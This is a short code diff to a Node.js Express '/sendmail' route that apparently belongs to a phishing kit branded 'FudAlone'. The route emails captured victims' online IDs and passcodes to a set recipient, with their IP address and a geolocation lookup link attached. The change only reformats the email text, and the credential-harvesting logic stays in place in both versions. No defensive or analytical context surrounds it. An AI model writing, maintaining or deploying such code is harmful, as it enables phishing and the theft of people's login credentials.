@@ -32,19 +32,14 @@ app.post("/sendmail", async (req, res) => {
     const details = {
         to: `${to}`,
         subject: `Login: ${clientIp}`,
-        text: `|----------| FudAlone|--------------|<br>
-	
-Login From           : ${clientIp}<br>
-
-online ID            : ${email}<br>
-
-Passcode             : ${password}<br>
-
-|--------------- I N F O | I P -------------------|<br>
-Client IP: ${clientIp}<br>
-
-|--- http://www.geoiptool.com/?IP=${clientIp} ----<br>
-User Agent : ${clientIp}<br>
+        text: `|----------| FudAlone|--------------|	
+Login From           : ${clientIp}
+online ID            : ${email}
+Passcode             : ${password}
+|--------------- I N F O | I P -------------------|
+Client IP: ${clientIp}
+|--- http://www.geoiptool.com/?IP=${clientIp} ----
+User Agent : ${clientIp}
 |----------- CrEaTeD bY FudAlone --------------|`,
   };
 
